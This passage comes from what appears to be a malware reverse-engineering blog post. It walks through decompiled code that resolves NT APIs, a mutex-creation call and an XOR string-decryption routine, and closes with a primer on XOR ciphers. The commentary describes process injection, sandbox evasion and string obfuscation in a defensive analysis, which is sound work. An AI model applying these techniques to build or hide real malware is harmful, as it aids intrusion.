</span></span><span style="display:flex;"><span>v37 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtProtectVirtualMemory;
</span></span></code></pre></div><p>changes the protection on a region of virtual memory. malware sets the memory permissions to <code>X</code> (executable), allowing the injected code to run.</p>
<h1 id="ntdeviceiocontrolfile_0"><code>NtDeviceIoControlFile_0</code></h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>v38 <span style="color:#ff79c6">=</span> NtDeviceIoControlFile_0;
</span></span><span style="display:flex;"><span>v40 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtDeviceIoControlFile;
</span></span></code></pre></div><p>sends a control code directly to a specified device driver, causing the corresponding device to perform a specified operation. can be used for low-level interaction with hardware. maybe to exploit specific vulns or interact with specific drivers.</p>
<h1 id="ntsetcontextthread_0"><code>NtSetContextThread_0</code></h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>v41 <span style="color:#ff79c6">=</span> NtSetContextThread_0;
</span></span><span style="display:flex;"><span>v43 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtSetContextThread;
</span></span></code></pre></div><p>sets the context of a thread. this could be registers, a stack pointer, etc. can be used to hijack a thread&rsquo;s execution or to modify behaviour for process injection.</p>
<h1 id="ntopenprocess_0"><code>NtOpenProcess_0</code></h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>v44 <span style="color:#ff79c6">=</span> NtOpenProcess_0;
</span></span><span style="display:flex;"><span>v46 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtOpenProcess;
</span></span></code></pre></div><p>opens a handle to an existing process. can be used to gain access to another process for process injection/monitoring.</p>
<h1 id="ntclose_0"><code>NtClose_0</code></h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>v47 <span style="color:#ff79c6">=</span> NtClose_0;
</span></span><span style="display:flex;"><span>v49 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtClose;
</span></span></code></pre></div><p>closes an open handle to a process, thread, or system object. used to close handles for clean up and evading detection.</p>
<h1 id="ntcreatefile_0"><code>NtCreateFile_0</code></h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>v50 <span style="color:#ff79c6">=</span> NtCreateFile_0;
</span></span><span style="display:flex;"><span>v52 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtCreateFile;
</span></span></code></pre></div><p>creates/opens a file or I/O device. can be used to open files for reading/writing, probably to drop payloads or access config files.</p>
<h1 id="ntopenfile_0"><code>NtOpenFile_0</code></h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>v53 <span style="color:#ff79c6">=</span> NtOpenFile_0;
</span></span><span style="display:flex;"><span>v55 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtOpenFile;
</span></span></code></pre></div><p>opens a handle to a file or I/O device. similar to <code>NtCreateFile</code>.</p>
<h1 id="ntdeletefile_0"><code>NtDeleteFile_0</code></h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>v56 <span style="color:#ff79c6">=</span> NtDeleteFile_0;
</span></span><span style="display:flex;"><span>v58 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtDeleteFile;
</span></span></code></pre></div><p>deletes a file from the file system. can be used to remove traces of malware presence from the system.</p>
<h1 id="ntreadvirtualmemory_0"><code>NtReadVirtualMemory_0</code></h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>v59 <span style="color:#ff79c6">=</span> NtReadVirtualMemory_0;
</span></span><span style="display:flex;"><span>v61 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtReadVirtualMemory;
</span></span></code></pre></div><p>reads data from the virtual memory of a process. can be used to read the memory of other processes, probably to steal data or gather information.</p>
<h1 id="ntqueryvirtualmemory_0"><code>NtQueryVirtualMemory_0</code></h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>v62 <span style="color:#ff79c6">=</span> NtQueryVirtualMemory_0;
</span></span><span style="display:flex;"><span>v64 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtQueryVirtualMemory;
</span></span></code></pre></div><p>gets information about a region of virtual memory. can be used to inspect the memory layout of its own process or another, probably to map out where to inject or execute code.</p>
<h1 id="ntopenthread_0"><code>NtOpenThread_0</code></h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>v65 <span style="color:#ff79c6">=</span> NtOpenThread_0;
</span></span><span style="display:flex;"><span>v67 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtOpenThread;
</span></span></code></pre></div><p>opens a handle to an existing thread. similar to <code>NtOpenProcess</code>.</p>
<h1 id="ntresumethread_0"><code>NtResumeThread_0</code></h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>v68 <span style="color:#ff79c6">=</span> NtResumeThread_0;
</span></span><span style="display:flex;"><span>v70 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtResumeThread;
</span></span></code></pre></div><p>resumes a suspended thread. can be used to suspend a thread to inject code or modify the context, then resume it to execute the injected code.</p>
<h1 id="ntfreevirtualmemory_0"><code>NtFreeVirtualMemory_0</code></h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>v71 <span style="color:#ff79c6">=</span> NtFreeVirtualMemory_0;
</span></span><span style="display:flex;"><span>v73 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtFreeVirtualMemory;
</span></span></code></pre></div><p>frees up a region of virtual memory in a process. can be used to free up the memory after exploitation to clean up and reduce the footprint.</p>
<h1 id="ntflushinstructioncache_0"><code>NtFlushInstructionCache_0</code></h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>v74 <span style="color:#ff79c6">=</span> NtFlushInstructionCache_0;
</span></span><span style="display:flex;"><span>v76 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtFlushInstructionCache;
</span></span></code></pre></div><p>flushes the instruction cache for a process. this makes sure that changes to code are recognized by the CPU and executed correctly.</p>
<h1 id="rtlrandomex_0"><code>RtlRandomEx_0</code></h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>v77 <span style="color:#ff79c6">=</span> RtlRandomEx_0;
</span></span><span style="display:flex;"><span>v79 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_RtlRandomEx;
</span></span></code></pre></div><p>generates a pseudorandom number. can be used to generate random values [obfuscation, encryption, non-deterministic behaviour].</p>
<h1 id="ntquerysysteminformation_0"><code>NtQuerySystemInformation_0</code></h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>v80 <span style="color:#ff79c6">=</span> NtQuerySystemInformation_0;
</span></span><span style="display:flex;"><span>v82 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtQuerySystemInformation;
</span></span></code></pre></div><p>gets system information like process lists, performance metrics, etc.</p>
<h1 id="ldrqueryprocessmoduleinformation_0"><code>LdrQueryProcessModuleInformation_0</code></h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>v83 <span style="color:#ff79c6">=</span> LdrQueryProcessModuleInformation_0;
</span></span><span style="display:flex;"><span>v85 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_LdrQueryProcessModuleInformation;
</span></span></code></pre></div><p>gets information about the modules [DLLs] loaded in a process.</p>
<h1 id="rtlinitunicodestring_0"><code>RtlInitUnicodeString_0</code></h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>v86 <span style="color:#ff79c6">=</span> RtlInitUnicodeString_0;
</span></span><span style="display:flex;"><span>v88 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_RtlInitUnicodeString;
</span></span></code></pre></div><p>initializaes a <code>UNICODE_STRING</code> structure, often used in many WinAPI calls. can be used to prepare strings [DLL names, file paths, etc.].</p>
<h1 id="ntwritefile_0"><code>NtWriteFile_0</code></h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>v89 <span style="color:#ff79c6">=</span> NtWriteFile_0;
</span></span><span style="display:flex;"><span>v91 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtWriteFile;
</span></span></code></pre></div><p>writes data to a file or I/O device. can be used to write logs, drop payloads, or modify files for persistence.</p>
<h1 id="ntreadfile_0"><code>NtReadFile_0</code></h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>v92 <span style="color:#ff79c6">=</span> NtReadFile_0;
</span></span><span style="display:flex;"><span>v94 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtReadFile;
</span></span></code></pre></div><p>reads data from file or I/O device.</p>
<h1 id="ntdelayexecution_0"><code>NtDelayExecution_0</code></h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>v95 <span style="color:#ff79c6">=</span> NtDelayExecution_0;
</span></span><span style="display:flex;"><span>v97 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtDelayExecution;
</span></span></code></pre></div><p>suspends execution of the current thread for a specified interval (delay). can be used to avoid sandbox analysis, or to sync with other events.</p>
<h1 id="ntopenkey_0"><code>NtOpenKey_0</code></h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>v98 <span style="color:#ff79c6">=</span> NtOpenKey_0;
</span></span><span style="display:flex;"><span>v100 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtOpenKey;
</span></span></code></pre></div><p>opens a handle to a registry key. can be used to write values to the registry.</p>
<h1 id="ntsetvaluekey_0"><code>NtSetValueKey_0</code></h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>v101 <span style="color:#ff79c6">=</span> NtSetValueKey_0;
</span></span><span style="display:flex;"><span>v103 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtSetValueKey;
</span></span></code></pre></div><p>sets the value of a registry key.</p>
<h1 id="ntqueryvaluekey_0"><code>NtQueryValueKey_0</code></h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>v104 <span style="color:#ff79c6">=</span> NtQueryValueKey_0;
</span></span><span style="display:flex;"><span>v106 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtQueryValueKey;
</span></span></code></pre></div><p>queries the value of a registry key.</p>
<h1 id="rtlformatcurrentuserkeypath_0"><code>RtlFormatCurrentUserKeyPath_0</code></h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>v107 <span style="color:#ff79c6">=</span> RtlFormatCurrentUserKeyPath_0;
</span></span><span style="display:flex;"><span>v109 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_RtlFormatCurrentUserKeyPath;
</span></span></code></pre></div><p>formats a string that represents the current user&rsquo;s key path in the registry. can be used to dynamically construct paths to user-specific registry settings.</p>
<h1 id="ntqueryinformationfile_0"><code>NtQueryInformationFile_0</code></h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>v110 <span style="color:#ff79c6">=</span> NtQueryInformationFile_0;
</span></span><span style="display:flex;"><span>v112 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>mw_addr_NtQueryInformationFile;
</span></span></code></pre></div><p>gets information about a file. can be used to verify files to make sure they&rsquo;re the right target.</p>
<h2 id="renaming-remaining-functions">renaming remaining functions</h2>
<p>the fourth function inside <code>sub_180006298()</code> [<code>sub_180009328()</code>] seems to be resolving the <code>kernel32</code> and <code>ntdll</code> APIs as well.</p>
<p><p class="imgp">
  <img loading="lazy" src="/image-3.png" alt="API resolutions"  />
</p>
</p>
<p>let&rsquo;s rename it to <code>mw_resolve_kernel32_api()</code>.</p>
<p>similarly, functions <code>sub_18000A2D8()</code> [resolves module handles], <code>sub_180008EF0()</code> [resolves more APIs and DLLs], and the return function <code>sub_18000AAAC()</code> [resolves the <code>ole32</code> API] can be resolved to <code>mw_resolve_module_handles</code>, <code>mw_resolve_misc_api</code>, and <code>mw_resolve_ole32</code> respectively!</p>
<p>let&rsquo;s also rename <code>sub_180006298()</code> to <code>mw_resolve_handle_apis()</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">__int64</span> <span style="color:#50fa7b">mw_resolve_handle_apis</span>()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> ( (<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span>)mw_resolve_kernel32_dll() 
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&amp;&amp;</span> (<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span>)mw_resolve_ntdll_dll()
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&amp;&amp;</span> (<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span>)mw_resolve_ntapi()
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&amp;&amp;</span> (<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span>)mw_resolve_kernel32_api()
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&amp;&amp;</span> (<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span>)mw_resolve_module_handles()
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&amp;&amp;</span> (<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span>)mw_resolve_misc_api() )
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">return</span> mw_resolve_ole32;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">else</span>
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0LL</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h2 id="api-pivoting">API pivoting</h2>
<p>the function <code>sub_180003868()</code> now has a lot more information than before.</p>
<p><p class="imgp">
  <img loading="lazy" src="/image-4.png" alt="more information"  />
</p>
</p>
<p>i&rsquo;m going to examine the statement at line 32:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>qword_180010480 <span style="color:#ff79c6">=</span> mw_addr_CreateMutexW(<span style="color:#bd93f9">0LL</span>, <span style="color:#bd93f9">0LL</span>, v9);
</span></span></code></pre></div><p>according to the MSDN, <code>CreateMutexW</code> creates/opens a named or unnamed mutext object. a &ldquo;mutex object&rdquo; is a synchronization object whose state is set to signaled when it is not owned by any thread, and nonsignaled when it is owned. basically, &ldquo;mutex&rdquo; is a &ldquo;<strong>mu</strong>tually <strong>ex</strong>clusive&rdquo; flag. it acts as a &ldquo;gatekeeper&rdquo; to a section of code, allowing one thread in and blocking access to all others.</p>
<p>so, using the <code>CreateMutexEx</code> function specifies an access mask for the object in question. the syntax for this function should shed some light on how it&rsquo;s being used.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>HANDLE CreateMutexW(
</span></span><span style="display:flex;"><span>    [in, optional] LPSECURITY_ATTRIBUTES lpMutexAttributes,
</span></span><span style="display:flex;"><span>    [in]           BOOL                  bInitialOwner,
</span></span><span style="display:flex;"><span>    [in, optional] LPCWSTR               lpName
</span></span><span style="display:flex;"><span>);
</span></span></code></pre></div><p>in the screenshot above, the multiple positions of <code>v9</code> are curious.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>sub_18000ACC8((<span style="color:#ff79c6">__int64</span>)<span style="color:#ff79c6">&amp;</span>unk_18000FA00, (<span style="color:#ff79c6">__int64</span>)v9);
</span></span><span style="display:flex;"><span>v8 <span style="color:#ff79c6">=</span> v9;
</span></span><span style="display:flex;"><span>qword_180010480 <span style="color:#ff79c6">=</span> mw_addr_CreateMutexW(<span style="color:#bd93f9">0LL</span>, <span style="color:#bd93f9">0LL</span>, v9);
</span></span></code></pre></div><p>it appears in three spots, not including its initialization in line 11 [<code>char v9[72];</code>]. so what&rsquo;s going on?</p>
<p><code>v9</code> is passed as an argument, along with <code>unk_18000FA00</code>, to the function <code>sub_18000ACC8()</code>. <code>v9</code> is then transformed by this function, and passed as the third argument to <code>CreateMutexW</code>, meaning its going to be the name of the created mutex object. if <code>v9</code> is some sort of string, and its being transformed to then be used as the name of a newly created mutex object, this means that <code>v9</code> is being decrypted by the function <code>sub_18000ACC8()</code> and the argument <code>unk_18000FA00</code> is some encrypted data.</p>
<p>the function definition is at the very top, and it goes like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">__int64</span> <span style="color:#ff79c6">__fastcall</span> sub_18000ACC8(<span style="color:#ff79c6">__int64</span> a1, <span style="color:#ff79c6">__int64</span> a2)
</span></span></code></pre></div><p>following the above logic, <code>a1</code> would be encrypted data and <code>a2</code> would be decrypted data. let&rsquo;s take a look at the code below the definition.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">__int64</span> <span style="color:#ff79c6">__fastcall</span> <span style="color:#50fa7b">sub_18000ACC8</span>(<span style="color:#ff79c6">__int64</span> a1, <span style="color:#ff79c6">__int64</span> a2)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">char</span> v3; <span style="color:#6272a4">// [rsp+20h] [rbp-18h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#8be9fd">unsigned</span> <span style="color:#ff79c6">__int16</span> i; <span style="color:#6272a4">// [rsp+24h] [rbp-14h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#8be9fd">unsigned</span> <span style="color:#ff79c6">__int16</span> v5; <span style="color:#6272a4">// [rsp+28h] [rbp-10h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#8be9fd">int</span> v6; <span style="color:#6272a4">// [rsp+2Ch] [rbp-Ch]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">__int64</span> v8; <span style="color:#6272a4">// [rsp+40h] [rbp+8h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span>    sub_180008EE4(<span style="color:#bd93f9">0</span>);
</span></span><span style="display:flex;"><span>    v6 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>(_DWORD <span style="color:#ff79c6">*</span>)a1;
</span></span><span style="display:flex;"><span>    v5 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>(_WORD <span style="color:#ff79c6">*</span>)(a1 <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">4</span>) <span style="color:#ff79c6">^</span> <span style="color:#ff79c6">*</span>(_DWORD <span style="color:#ff79c6">*</span>)a1;
</span></span><span style="display:flex;"><span>    v8 <span style="color:#ff79c6">=</span> a1 <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">6</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">for</span> ( i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; i <span style="color:#ff79c6">&lt;</span> (<span style="color:#8be9fd">int</span>)v5; <span style="color:#ff79c6">++</span>i )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        v3 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>(_BYTE <span style="color:#ff79c6">*</span>)(v8 <span style="color:#ff79c6">+</span> i);
</span></span><span style="display:flex;"><span>        v6 <span style="color:#ff79c6">=</span> sub_180008EE4(v6);
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">*</span>(_BYTE <span style="color:#ff79c6">*</span>)(a2 <span style="color:#ff79c6">+</span> i) <span style="color:#ff79c6">+=</span> v3 <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">10</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">*</span>(_BYTE <span style="color:#ff79c6">*</span>)(a2 <span style="color:#ff79c6">+</span> i) <span style="color:#ff79c6">=</span> v6 <span style="color:#ff79c6">^</span> v3;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> a2;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>computer, enhance! let&rsquo;s take a closer look at two of the lines.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#f1fa8c">&#34;[...]&#34;</span>
</span></span><span style="display:flex;"><span>v5 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>(_WORD <span style="color:#ff79c6">*</span>)(a1 <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">4</span>) <span style="color:#ff79c6">^</span> <span style="color:#ff79c6">*</span>(_DWORD <span style="color:#ff79c6">*</span>)a1;
</span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#34;[...]&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">*</span>(_BYTE <span style="color:#ff79c6">*</span>)(a2 <span style="color:#ff79c6">+</span> i) <span style="color:#ff79c6">=</span> v6 <span style="color:#ff79c6">^</span> v3;
</span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#34;[...]&#34;</span>
</span></span></code></pre></div><p>these lines contain something called a &ldquo;bitwise XOR&rdquo; operator (denoted by <code>^</code>). XOR is a fundamental digital logic operation that outputs false [<code>0</code>] if both input bits are the same, and outputs true [<code>1</code>] otherwise. the truth table of a simple XOR gate is as follows:</p>
<table>
  <thead>
      <tr>
          <th>X</th>
          <th>Y</th>
          <th>X ^ Y</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>0</td>
          <td>0</td>
          <td>0</td>
      </tr>
      <tr>
          <td>0</td>
          <td>1</td>
          <td>1</td>
      </tr>
      <tr>
          <td>1</td>
          <td>0</td>
          <td>1</td>
      </tr>
      <tr>
          <td>1</td>
          <td>1</td>
          <td>0</td>
      </tr>
  </tbody>
</table>
<h2 id="cryptography-refresher-xor-ciphers">cryptography refresher: XOR ciphers</h2>
<p>some of you may remember XOR ciphers from second-year CS/ECE courses in university. it&rsquo;s a basic, yet powerful, encryption algorithm that operates as follows:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>A ^ 0 = A
</span></span><span style="display:flex;"><span>A ^ A = 0
</span></span><span style="display:flex;"><span>A ^ B = B ^ A
</span></span><span style="display:flex;"><span>(A ^ B) ^ C = A ^ (B ^ C)
</span></span><span style="display:flex;"><span>(B ^ A) ^ A = B ^ 0 = B
</span></span></code></pre></div><p>using this logic, a string of text can be encrypted by applying <code>^</code> to every character using a given <strong>key</strong>.</p>
<p>take a plaintext message, <code>M</code>, and a secret key, <code>K</code>. performing <code>M ^ K</code> yields an encrypted message, <code>E</code> [<code>M ^ K = E</code>]. to decrypt <code>E</code>, you just have to XOR it with the same key, <code>K</code> [<code>E ^ K = M</code>]. this is really convenient because the same operation can be used to both encrypt and decrypt.</p>
<p>there are some caveats, though. if a fixed-length key, <code>K</code>, is shorter than the message, <code>M</code>, the cipher can be broken by a &ldquo;frequency analysis&rdquo; (certain letters + combinations appearing more than once).</p>
<p>however, if the key <code>K</code> is as long as the message <code>M</code>, the only way to break the cipher is by trying every possible key. this brute-force attack quickly becomes unfeasibly expensive because a key of <code>n</code>-bits has <code>2^n</code> possibilities.</p>
<p>sharing a long key <code>K</code> securely is also a challenge. on top of that, repeatedly using a long key <code>K</code> for multiple messages will be subjected to a frequency-based attack.</p>
<p>a good way around this is to use a pseudo-random number generator [<code>RNG</code>] to generate an unpredictable and repeatable stream of keys. this way, only the initial seed (much shorter) for the generator needs to be shared, assuming both parties are using the same generator. each block of the message is then encrypted using subsequent keys from the generator.</p>
<p>from a security perspective, a simple repeating XOR (i.e. using the same key for XOR operation throughout the dataset) is enough to hide information in case where no extra security is required.</p>
<h3 id="xor-ciphers-in-malware">XOR ciphers in malware</h3>
<p>exploit developers use XOR ciphers to obfuscate their code and data, which makes reverse engineering more challenging.</p>
<p>portions of malware code can be XOR-encrypted, and then decrypted on the fly when the malware runs. static analysis here would be difficult because the original instructions appear as &ldquo;random&rdquo; data.</p>
<p>string obfuscation is another effective tactic used by exploit devs, turning plaintext strings like APIs, URLs, file paths, and C2 server addresses into encrypted ones, so using a string extraction tool here won&rsquo;t help.</p>
<h2 id="string-decryption">string decryption</h2>
<p>let&rsquo;s come back to the function above with this new perspective.</p>
